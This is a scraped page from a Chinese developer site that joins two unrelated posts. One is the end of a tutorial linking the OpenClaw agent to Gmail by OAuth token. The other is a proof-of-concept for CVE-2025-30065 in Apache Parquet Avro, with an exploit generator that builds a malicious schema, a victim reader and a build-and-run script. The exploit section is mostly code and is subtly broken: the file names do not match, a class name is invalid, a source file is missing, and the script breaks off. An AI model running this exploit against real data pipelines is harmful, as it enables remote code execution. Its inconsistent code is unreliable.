  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/177fdcfa8f6c479d9cda30c98d7cf509~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=iwe9cwvVQuU7LW%2FQ82XnsEHYLxw%3D" alt="Google Cloud Console 启用API" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console 启用API
  </figcaption>
</figure>
<ol start="3">
<li>找到 <strong>Gmail API</strong> 并启用</li>
</ol>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd4111d584924629a241be6b7493c17c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=U5VALO%2ByY751WPbJmyhSB4ZFPOY%3D" alt="Google Cloud Console 创建凭证" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console 创建凭证
  </figcaption>
</figure>
<ol start="4">
<li>回到控制台 <strong>API 和服务 → 凭证 → 创建凭证 → OAuth 客户端 ID</strong>，类型选择 <strong>Desktop App（桌面应用）</strong>。创建完成后会生成客户端 ID 和客户端密钥，这两个一定要保存好。并下载 <code>client_secret_*.json</code> 文件。</li>
</ol>
<p><a id="user-content-oauth-consent-screen" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/984e1ce807b04a1c9b1ca7f633aeef76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=2t7MxHO8wfxhdpc4BamXTMjpCAc%3D" alt="Google Cloud Console OAuth consent screen" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console OAuth consent screen
  </figcaption>
</figure>
<ol start="5">
<li>在搜索框输入 <strong>OAuth consent screen</strong>，在 <strong>目标对象 → 测试用户</strong> 中添加自己的 Gmail 邮箱</li>
</ol>
<h3 data-id="heading-5">OpenClaw 配置</h3>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a251ab2b4a2544158ea8f5abec2d0972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=6i3TKu9qHTg5dPsCPg9ioodiXQY%3D" alt="OpenClaw Config Email" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    OpenClaw Config Email
  </figcaption>
</figure>
<p>接下来把刚刚下载的 <code>client_secret_*.json</code> 文件和自己的需求发给 OpenClaw。</p>
<p>这时会得到类似回复：</p>
<pre><code class="hljs language-bash" lang="bash">行，老板，三项设置我收到了：

1. 标记已读
2. 每 3 小时推送一次
3. 只推 Primary 未读
但现在还差最后一步：我需要你再给我一个 gmail_token.json（里面必须带 refresh_token），这样我才能在服务器上定时拉取邮件并“标记已读”。
注意：为了能标记已读，授权 scope 需要 gmail.modify（只读的 gmail.readonly 不够）。

你要做的事（在你自己的电脑上，5 分钟）

1. 新建一个文件夹，把你刚发的那个 client_secret.json 放进去
2. 在该文件夹里执行：
npm init -y
npm i googleapis @google-cloud/local-auth
3. 然后下载/复制我这段脚本（我服务器里已经准备好了同名脚本，你也可以让我发你文本），保存为 gmail_token_from_desktop.js，再运行：
node gmail_token_from_desktop.js ./client_secret.json
它会弹浏览器让你登录授权，成功后会生成 gmail_token.json。

4. 把生成的 gmail_token.json 发回给我（文件形式）。
我拿到 token 后会做什么

• 在服务器上启用定时任务：每 3 小时检查 is:unread category:primary
• 有新邮件就给你发 Telegram 摘要（标题/发件人/时间/摘要）
• 然后把这些邮件标记为已读（避免重复推送）
顺带一句：你刚发的 client_secret 属于敏感信息，但它单独不能直接读你邮箱；真要停用也很简单——去 Google 账号里撤销第三方授权即可。

你把 gmail_token.json 发我就可以开跑了。
</code></pre>
<p>下面是具体设置步骤（以下操作在本机完成，不是在服务器上）：</p>
<ol>
<li>新建一个文件夹，把 <code>client_secret_*.json</code> 拖进去并改名为 <code>client_secret.json</code>（如不放心可先备份）</li>
<li>在该文件夹内执行下面 2 个命令：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">npm init -y
npm i googleapis @google-cloud/local-auth
</code></pre>
<ol start="3">
<li>创建一个名为 <code>gmail_token_from_desktop.js</code> 的文件，内容如下：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> { authenticate } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@google-cloud/local-auth'</span>);
<span class="hljs-keyword">const</span> { google } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'googleapis'</span>);

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SCOPES</span> = [<span class="hljs-string">'https://www.googleapis.com/auth/gmail.modify'</span>];

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> clientPath = process.<span class="hljs-property">argv</span>[<span class="hljs-number">2</span>];
  <span class="hljs-keyword">if</span> (!clientPath) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Usage: node gmail_token_from_desktop.js ./client_secret.json'</span>);
    process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">const</span> auth = <span class="hljs-keyword">await</span> <span class="hljs-title function_">authenticate</span>({
    <span class="hljs-attr">keyfilePath</span>: path.<span class="hljs-title function_">resolve</span>(clientPath),
    <span class="hljs-attr">scopes</span>: <span class="hljs-variable constant_">SCOPES</span>,
  });

  <span class="hljs-keyword">const</span> tokenPath = path.<span class="hljs-title function_">join</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'gmail_token.json'</span>);
  fs.<span class="hljs-title function_">writeFileSync</span>(tokenPath, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(auth.<span class="hljs-property">credentials</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>));
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Saved token to:'</span>, tokenPath);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Scopes:'</span>, <span class="hljs-variable constant_">SCOPES</span>.<span class="hljs-title function_">join</span>(<span class="hljs-string">' '</span>));
}

<span class="hljs-title function_">main</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
  process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
});
</code></pre>
<ol start="4">
<li>运行命令后浏览器会打开并进入 Google 授权。如果授权失败出现 <code>Access blocked: ... has not completed the Google verification process (403)</code>，说明未把自己的邮箱添加到测试用户中，解决办法参考<a href="#oauth-consent-screen" title="#oauth-consent-screen">上面第 5 步</a>。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">node gmail_token_from_desktop.js ./client_secret.json
</code></pre>
<ol start="5">
<li>生成 <code>gmail_token.json</code> 后发送给 OpenClaw</li>
</ol>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff51eddbc52e4118a67abe22f58ce186~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=wwW4cbCHTmgEkomn69%2B2b%2Fy6Wgw%3D" alt="发送gmail_token" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    发送gmail_token
  </figcaption>
</figure>
<p>看到这里 Gmail 就已经授权成功给 OpenClaw。</p>
<p>现在我们可以测试一下，比如发送：<strong>帮忙总结一下最近的邮件</strong>。</p>
<p>可以得到回复：</p>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01c8e4c8cad943b7a03d2d16ca942bdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=UkcIRXrWo%2BH7AsexEIzBblZu1Bg%3D" alt="OpenClaw Email Summary" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    OpenClaw Email Summary
  </figcaption>
</figure>
<p>说明 OpenClaw 已经可以读取你的邮件了。</p>
<h4 data-id="heading-6">每天按时总结</h4>
<p>如果想每天定时让 OpenClaw 帮你总结邮件，可以告诉它：<strong>每天早上 9:00 帮忙总结重要邮件的摘要</strong>。这样每天早上 9 点它会按时执行并总结。</p>
<h3 data-id="heading-7">实时邮件处理发布/订阅（可选，这里不做演示）</h3>
<p>配置如下（编辑 <code>~/.openclaw/openclaw.json</code>）：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"gmail"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"topic"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your-pubsub-topic"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"subscription"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your-subscription-name"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-8">总结</h2>
<p>到这里，OpenClaw 集成 Gmail 的设置就完成了。后续你可以继续扩展更多规则（如指定发件人、关键字过滤、自动标签等）。如果有任何问题或想法，欢迎在评论区留言交流。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065]]></title>    <link>https://juejin.cn/post/7602177588443299859</link>    <guid>https://juejin.cn/post/7602177588443299859</guid>    <pubDate>2026-02-03T05:32:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602177588443299859" data-draft-id="7602191709388832810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-02-03T05:32:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:32:28.000Z" title="Tue Feb 03 2026 05:32:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065</h2>
<h4 data-id="heading-1">⚠️ 风险概述</h4>
<ul>
<li><strong>严重性</strong>：CVSS评分 <strong>10.0（严重☠️）</strong>。</li>
<li><strong>攻击方式</strong>：攻击者可构造恶意Parquet文件，其嵌入的Avro模式旨在触发任意Java类的实例化。</li>
<li><strong>后果</strong>：在特定条件下，可导致<strong>远程代码执行（RCE）</strong>。</li>
</ul>
<h3 data-id="heading-2">功能特性</h3>
<p>本POC项目完整演示了CVE-2025-30065漏洞的利用链：</p>
<ul>
<li><strong>恶意文件生成</strong>：<code>ParquetExploitGenerator</code> 类创建包含恶意Avro模式的Parquet文件。</li>
<li><strong>漏洞触发模拟</strong>：<code>ParquetVictim</code> 类模拟受害者应用程序读取恶意Parquet文件。</li>
<li><strong>依赖管理自动化</strong>：通过Shell脚本自动处理Maven依赖解析与项目编译。</li>
<li><strong>跨平台payload（历史参考）</strong>：<code>PayloadRecord</code> 类展示了静态初始化块中的命令执行逻辑（在新版POC中已被更隐蔽的类实例化逻辑覆盖）。</li>
</ul>
<h3 data-id="heading-3">安装指南</h3>
<h4 data-id="heading-4">前置要求</h4>
<ul>
<li>Java 8+</li>
<li>Maven</li>
</ul>
<h4 data-id="heading-5">安装步骤</h4>
<p>项目提供了自动化构建脚本 <code>CVE-2025-30065.sh</code>。</p>
<ol>
<li>确保脚本具有可执行权限：
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">chmod</span> +x CVE-2025-30065.sh
</code></pre>
</li>
<li>运行脚本，它将自动解析依赖、编译所有Java文件并执行完整的POC链条：
<pre><code class="hljs language-bash" lang="bash">./CVE-2025-30065.sh
</code></pre>
</li>
</ol>
<h3 data-id="heading-6">使用说明</h3>
<p>运行自动化脚本后，将按顺序执行以下操作：</p>
<ol>
<li><strong>生成恶意Parquet文件</strong>：使用 <code>ParquetExploitGenerator</code> 创建一个名为 <code>exploit-jeditorpane.parquet</code> 的文件，其Avro模式的默认值字段被精心构造为实例化 <code>javax.swing.JEditorPane</code> 类。</li>
<li><strong>模拟受害者读取</strong>：<code>ParquetVictim</code> 应用程序读取该文件，在反序列化Avro模式并处理默认值时触发目标类的实例化。</li>
</ol>
<h4 data-id="heading-7">基础工作流程</h4>
<p>整个漏洞利用的核心流程封装在Shell脚本中，其逻辑如下：</p>
<ol>
<li>使用Maven解析项目依赖并生成类路径文件。</li>
<li>编译所有必要的Java源代码。</li>
<li>运行漏洞生成器创建恶意文件。</li>
<li>运行受害者程序触发漏洞。</li>
</ol>
<h3 data-id="heading-8">核心代码</h3>
<h4 data-id="heading-9">1. 恶意Parquet文件生成器 (<code>ParquetExploitGenerator.java</code>)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@author</span> Blackash
 * <span class="hljs-doctag">@version</span> 1.3
 * <span class="hljs-doctag">@license</span> For authorized security research and educational purposes only.
 *
 * Generates a Parquet file with a crafted Avro schema to demonstrate CVE-2025-30065,
 * aligned with the vulnerability logic observed in the official Apache patch.
 *
 * This version avoids using custom classes and instead leverages a standard Java class
 * (javax.swing.JEditorPane) known to exhibit side effects when deserialized.
 *
 */</span>
<span class="hljs-keyword">import</span> org.apache.avro.Schema;
<span class="hljs-keyword">import</span> org.apache.hadoop.conf.Configuration;
<span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;
<span class="hljs-keyword">import</span> org.apache.parquet.avro.AvroParquetWriter;
<span class="hljs-keyword">import</span> org.apache.parquet.hadoop.ParquetWriter;

<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParquetExploitGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 默认输出文件名为 exploit-jeditorpane.parquet</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> args.length &gt; <span class="hljs-number">0</span> ? args[<span class="hljs-number">0</span>] : <span class="hljs-string">"exploit-jeditorpane.parquet"</span>;
        <span class="hljs-comment">// 恶意Avro模式定义：其‘trigger’字段的类型被设置为‘javax.swing.JEditorPane’记录</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">maliciousSchema</span> <span class="hljs-operator">=</span> <span class="hljs-string">"{"</span>
            + <span class="hljs-string">"\"type\": \"record\","</span> 
            + <span class="hljs-string">"\"name\": \"ExploitRecord\","</span> 
            + <span class="hljs-string">"\"fields\": ["</span>
            + <span class="hljs-string">"  {\"name\": \"trigger\","</span> 
            + <span class="hljs-string">"   \"type\": {\"type\": \"record\", \"name\": \"javax.swing.JEditorPane\", \"fields\": []},"</span>
            + <span class="hljs-string">"   \"default\": {}"</span> <span class="hljs-comment">// 默认值为空对象，触发目标类实例化</span>
            + <span class="hljs-string">"  }"</span>
            + <span class="hljs-string">"]"</span>
            + <span class="hljs-string">"}"</span>;
        <span class="hljs-comment">// 解析模式</span>
        <span class="hljs-type">Schema</span> <span class="hljs-variable">schema</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Schema</span>.Parser().parse(maliciousSchema);
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Path</span>(outputFile);
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">conf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>();
        <span class="hljs-comment">// 使用AvroParquetWriter写入文件</span>
        <span class="hljs-keyword">try</span> (ParquetWriter&lt;Object&gt; writer = AvroParquetWriter.builder(path)
                .withSchema(schema)
                .withConf(conf)
                .build()) {
            writer.write(<span class="hljs-literal">null</span>);
        }
        System.out.println(<span class="hljs-string">"[+] Malicious Parquet file generated: "</span> + outputFile);
        System.out.println(<span class="hljs-string">"[!] Schema instantiates javax.swing.JEditorPane via default value."</span>);
    }
}
</code></pre>
<h4 data-id="heading-10">2. 受害者应用程序 (<code>ParquetVictim.java</code>)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> victim;

<span class="hljs-keyword">import</span> org.apache.avro.generic.GenericRecord;
<span class="hljs-keyword">import</span> org.apache.parquet.avro.AvroParquetReader;
<span class="hljs-keyword">import</span> org.apache.parquet.hadoop.ParquetReader;
<span class="hljs-keyword">import</span> org.apache.hadoop.conf.Configuration;
<span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParquetVictim</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 读取恶意Parquet文件</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Path</span>(<span class="hljs-string">"exploit.parquet"</span>);
        ParquetReader&lt;GenericRecord&gt; reader = AvroParquetReader.&lt;GenericRecord&gt;builder(path)
            .withConf(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>())
            .build();
        <span class="hljs-comment">// 读取记录，此操作会触发Avro模式中默认值的反序列化，从而实例化恶意类</span>
        <span class="hljs-type">GenericRecord</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> reader.read();
        System.out.println(<span class="hljs-string">"Record loaded: "</span> + record); <span class="hljs-comment">// this triggers instantiation of default</span>
    }
}
</code></pre>
<h4 data-id="heading-11">3. 自动化构建与执行脚本 (<code>CVE-2025-30065.sh</code>)</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
BASE_DIR=$(<span class="hljs-built_in">pwd</span>)
BUILD_DIR=<span class="hljs-string">"<span class="hljs-variable">$BASE_DIR</span>/build/classes"</span>
CP_FILE=<span class="hljs-string">"<span class="hljs-variable">$BASE_DIR</span>/cp.txt"</span>
JAR_DEPS=<span class="hljs-string">""</span>
<span class="hljs-comment"># 检查Maven并解析依赖</span>
<span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v mvn &amp;&gt; /dev/null; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Resolving dependencies with Maven..."</span>
    mvn dependency:build-classpath -Dmdep.outputFile=cp.txt &gt; /dev/null
    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"<span class="hljs-variable">$CP_FILE</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"[-] Failed to generate classpath (cp.txt)."</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    JAR_DEPS=$(<span class="hljs-built_in">cat</span> <span class="hljs-string">"<span class="hljs-variable">$CP_FILE</span>"</span>)
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[-] Maven not found. Please install Maven and run again."</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>
<span class="hljs-comment"># 创建构建目录</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Compiling PayloadRecord.java..."</span>
javac -d <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span> PayloadRecord.java || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Compiling ParquetExploitGenerator..."</span>
javac -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> -d <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span> POC-CVE-2025-30065-ParquetExploitGenerator.java || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Running exploit generator..."</span>
java -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> POC-CVE-2025-30065-ParquetExploitGenerator || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Compiling ParquetVictim.java..."</span>
javac -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> -d <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span> ParquetVictim.java || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Running victim (payload should trigger)..."</span>
